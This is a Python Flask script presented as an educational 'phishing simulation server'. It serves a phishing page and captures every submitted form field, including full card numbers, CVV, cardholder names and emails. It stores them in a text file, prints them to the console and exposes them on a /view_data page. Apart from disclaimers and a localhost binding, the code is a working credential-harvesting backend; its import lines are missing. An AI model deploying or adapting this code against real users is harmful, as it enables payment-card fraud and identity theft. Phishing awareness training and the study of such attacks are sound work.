#!/usr/bin/env python3
app = Flask(__name__)

# File to store captured data
DATA_FILE = 'login_data.txt'

def log_data(data):
    """Write captured data to a text file with timestamp"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    with open(DATA_FILE, 'a', encoding='utf-8') as f:
        f.write(f"\n{'='*60}\n")
        f.write(f"Timestamp: {timestamp}\n")
        f.write(f"{'='*60}\n")
        
        for key, value in data.items():
            # Mask sensitive data for partial display
            if 'card' in key.lower() or 'cvv' in key.lower():
                masked_value = '*' * (len(value) - 4) + value[-4:] if len(value) > 4 else '****'
                f.write(f"{key}: {masked_value} (Full: {value})\n")
            else:
                f.write(f"{key}: {value}\n")
        
        f.write(f"{'='*60}\n\n")
        f.flush()

@app.route('/')
def index():
    """Serve the phishing page"""
    html_file = os.path.join(os.path.dirname(__file__), 'index.html')
    if os.path.exists(html_file):
        with open(html_file, 'r', encoding='utf-8') as f:
            return f.read()
    return "Error: index.html not found", 404

@app.route('/submit', methods=['POST'])
def submit():
    """Capture and store submitted data"""
    # Collect all form data
    captured_data = {}
    
    for key in request.form:
        captured_data[key] = request.form[key]
    
    # Log the captured data
    log_data(captured_data)
    
    # Print to console for immediate feedback
    print(f"\n[PHISHING SIMULATION] Data captured at {datetime.now()}")
    print(f"Card Number: {captured_data.get('cardNumber', 'N/A')}")
    print(f"Cardholder: {captured_data.get('cardholderName', 'N/A')}")
    print(f"Email: {captured_data.get('email', 'N/A')}")
    print(f"Data saved to: {DATA_FILE}\n")
    
    # Redirect to a "success" page (in real phishing, this might redirect to legitimate site)
    success_page = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Verification Successful</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                margin: 0;
            }
            .container {
                background: white;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 10px 40px rgba(0,0,0,0.2);
                text-align: center;
                max-width: 500px;
            }
            h1 { color: #4caf50; margin-bottom: 20px; }
            p { color: #666; line-height: 1.6; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>✓ Verification Successful</h1>
            <p>Thank you for verifying your payment information.</p>
            <p style="margin-top: 20px; font-size: 14px; color: #999;">
                This is a simulation. In a real phishing attack, your data would be stolen.
            </p>
        </div>
    </body>
    </html>
    """
    
    return success_page

@app.route('/view_data')
def view_data():
    """View captured data (for educational purposes)"""
    if not os.path.exists(DATA_FILE):
        return "No data captured yet.", 200
    
    with open(DATA_FILE, 'r', encoding='utf-8') as f:
        content = f.read()
    
    # Display in a formatted way
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Captured Data (Educational)</title>
        <style>
            body {{
                font-family: monospace;
                padding: 20px;
                background: #f5f5f5;
            }}
            pre {{
                background: white;
                padding: 20px;
                border-radius: 5px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                white-space: pre-wrap;
                word-wrap: break-word;
            }}
            .warning {{
                background: #fff3cd;
                border-left: 4px solid #ffc107;
                padding: 15px;
                margin-bottom: 20px;
                border-radius: 4px;
            }}
        </style>
    </head>
    <body>
        <div class="warning">
            <strong>⚠️ Educational Purpose Only:</strong> This page shows how phishing attacks capture data.
            In a real attack, this data would be sent to attackers.
        </div>
        <h2>Captured Data:</h2>
        <pre>{content}</pre>
    </body>
    </html>
    """
    
    return html_content

if __name__ == '__main__':
    print("="*60)
    print("PHISHING SIMULATION SERVER (Educational Purpose Only)")
    print("="*60)
    print("⚠️  WARNING: This is for educational use only!")
    print("   Do not use this for malicious purposes.")
    print("="*60)
    print(f"\nServer running on: http://127.0.0.1:5000")
    print(f"Phishing page: http://127.0.0.1:5000/")
    print(f"View captured data: http://127.0.0.1:5000/view_data")
    print(f"Data will be saved to: {DATA_FILE}")
    print("\nPress Ctrl+C to stop the server\n")
    print("="*60)
    
    app.run(host='127.0.0.1', port=5000, debug=True)

